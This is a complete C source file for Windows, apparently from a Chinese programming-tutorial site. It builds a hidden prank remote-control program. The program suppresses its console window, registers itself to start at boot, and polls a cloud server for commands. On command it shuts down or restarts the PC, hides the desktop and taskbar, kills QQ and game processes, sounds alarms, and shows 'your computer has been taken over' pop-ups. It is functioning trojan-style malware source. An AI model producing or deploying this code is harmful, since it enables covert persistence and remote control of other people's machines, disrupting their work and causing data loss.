#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include "itmojun.h"


//向当前工程引入winmm.lib这个库文件，因为我们下面要调用它里面的mciSendString函数
#pragma comment(lib, "winmm.lib")
//向当前工程引入itmojun.lib这个库文件，因为我们下面要调用它里面的AutoRun函数和GetPCCmd函数
#pragma comment(lib, "itmojun.lib")

//设置子系统为windows，即窗口应用程序，并且显式指定程序的入口为main函数，因为窗口应用程序的默认入口为WinMain函数
//这条预处理命令的作用是让当前程序在运行时不显示控制台窗口，隐藏运行
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")


volatile int  bBeep = 0;  //决定蜂鸣器是否报警的标志，0表示静音，非零表示报警
volatile int  bShowText = 0;  //决定是否显示字幕的标志，0表示不显示，非零表示显示
volatile int  bMessageBox = 0;  //决定是否显示消息框，0表示不显示，非零表示显示
//指定当前电脑的ID
//如果想单独控制不同的电脑，则这些电脑上的程序应该使用不同的PcId
//如果想同时控制多台电脑，则这些电脑上的程序应该使用相同的PcId
const char* szPcId = "itmojun";

DWORD WINAPI BeepThr(LPVOID lpParam);
DWORD WINAPI ShowTextThr(LPVOID lpParam);
DWORD WINAPI MessageBoxThr(LPVOID lpParam);


int main()
{
	HANDLE hMutex;
	char szCmd[301];  //存放远程控制指令
	HANDLE hBeepThr = NULL;
	HANDLE hShowTextThr = NULL;
	HANDLE hMessageBoxThr = NULL;

	//只允许单实例运行
	hMutex = CreateMutex(NULL, TRUE, "dj_201903061509");
	
	if(NULL != hMutex)
	{
		if(ERROR_ALREADY_EXISTS == GetLastError())
		{
			return 0;
		}
	}

	//设置控制台窗口标题
	//system("title 远程控制任我行 - IT魔君");

	AutoRun();  //将当前程序设置为开机自动运行

	//创建一个线程，由该线程负责控制报警和静音
	hBeepThr = CreateThread(NULL, 0, BeepThr, NULL, 0, NULL);
	CloseHandle(hBeepThr);

	//创建一个线程，由该线程负责控制字幕显示和隐藏
	hShowTextThr = CreateThread(NULL, 0, ShowTextThr, NULL, 0, NULL);
	CloseHandle(hShowTextThr);

	//创建一个线程，由该线程负责控制是否弹出消息框
	hMessageBoxThr = CreateThread(NULL, 0, MessageBoxThr, NULL, 0, NULL);
	CloseHandle(hMessageBoxThr);

	while(1)
	{
		//从云端服务器接收一条发送给当前电脑的控制指令（字符串消息），存放到szCmd数组中
		//如果当前电脑无法接入外网或者云端服务器上没有任何控制指令，GetPCCmd函数将会一直阻塞等待
		GetPCCmd(szPcId, szCmd);

		printf("\n接收到远程控制指令：%s\n", szCmd);

		if(strstr(szCmd, "关机"))
		{
			//关机
			WinExec("shutdown -s -t 0", 0);
		}	
		else if(strstr(szCmd, "重启"))
		{
			//重启
			WinExec("shutdown -r -t 0", 0);
		}
		else if(strstr(szCmd, "干掉桌面"))
		{
			//结束桌面进程(explorer.exe)
			//WinExec("cmd /C taskkill /f /im explorer.exe", 0);

			HWND desktop, taskbar;
			desktop = FindWindow("ProgMan", NULL);  //查找桌面窗口获得其窗口句柄 
			taskbar = FindWindow("Shell_TrayWnd", NULL);  //查找任务栏窗口获得其窗口句柄
			ShowWindow(desktop, SW_HIDE);  //隐藏桌面
			ShowWindow(taskbar, SW_HIDE);  //隐藏任务栏
		}
		else if(strstr(szCmd, "恢复桌面"))
		{
			//启动桌面进程(explorer.exe)
			//WinExec("explorer", 1);  //Win10系统不起作用

			HWND desktop, taskbar;
			desktop = FindWindow("ProgMan", NULL);  //查找桌面窗口获得其窗口句柄 
			taskbar = FindWindow("Shell_TrayWnd", NULL);  //查找任务栏窗口获得其窗口句柄
			ShowWindow(desktop, SW_SHOW);  //显示桌面
			ShowWindow(taskbar, SW_SHOW);  //显示任务栏
		}
		else if(strstr(szCmd, "杀企鹅"))
		{
			//强制结束QQ进程
			WinExec("cmd /C taskkill /f /im qq.exe", 0);
		}
		else if(strstr(szCmd, "亚索"))
		{
			//强制结束英雄联盟进程
			WinExec("cmd /C taskkill /f /im client.exe", 0);
		}
		else if(strstr(szCmd, "网站"))
		{
			//打开网站
			WinExec("explorer https://itmojun.com", 1);
		}
		else if(strstr(szCmd, "播放"))
		{
			//播放背景音乐
			mciSendString("play bg.mp3", NULL, 0, NULL);
		}	
		else if(strstr(szCmd, "暂停"))
		{
			//暂停背景音乐
			mciSendString("pause bg.mp3", NULL, 0, NULL);
		}	
		else if(strstr(szCmd, "停止"))
		{
			//停止背景音乐
			mciSendString("stop bg.mp3", NULL, 0, NULL);
		}		
		else if(strstr(szCmd, "报警"))
		{
			//报警
			bBeep = 1;
		}	
		else if(strstr(szCmd, "静"))
		{
			//静音
			bBeep = 0;
		}
		else if(strstr(szCmd, "显示字幕"))
		{
			bShowText = 1;
		}
		else if(strstr(szCmd, "隐藏字幕"))
		{
			bShowText = 0;
		}
		else if(strstr(szCmd, "弹出消息框"))
		{
			//弹出消息框
			bMessageBox = 1;
		}
		else if(strstr(szCmd, "关闭消息框"))
		{
			//关闭消息框
			bMessageBox = 0;
		}
        
        Sleep(3000);  //PC控制指令在云端服务器会保持3秒，这期间可以重复获取，这里休眠3秒是为了让程序不会把同一条控制指令重复获取多次
	}

	return 0;
}


DWORD WINAPI BeepThr(LPVOID lpParam)
{
	while(1)
	{
		if(bBeep)
		{
			Beep(1000, 500);
		}
		else
		{
			Sleep(500);
		}
	}

	return 0;
}


DWORD WINAPI ShowTextThr(LPVOID lpParam)
{
	HFONT hFont = CreateFont(100,50,0,0,FW_BOLD,0,0,0,ANSI_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,DEFAULT_QUALITY,DEFAULT_PITCH|FF_SWISS,"宋体");						
	HFONT hOldFont;
	HDC hdc;
	const char *pszText = "君哥到此一游！";

	while(1)
	{
		if(bShowText)
		{
			hdc = GetDC(NULL);
			
			SetBkMode(hdc,TRANSPARENT);
			SetTextColor(hdc,RGB(255,0,0));						
			
			hOldFont=(HFONT)SelectObject(hdc,hFont);
									
			TextOut(hdc,10,20,pszText,strlen(pszText));
			
			SelectObject(hdc,hOldFont);
			ReleaseDC(NULL,hdc);			
		}

		Sleep(100);
	}

	return 0;
}


DWORD WINAPI MessageBoxThr(LPVOID lpParam)
{
	while(1)
	{
		if(bMessageBox)
			MessageBox(NULL, "哈哈，你的电脑已被君哥接管！", "骚气提示", MB_OK | MB_ICONWARNING | MB_TOPMOST);
		else
			Sleep(500);
	}

	return 0;
}
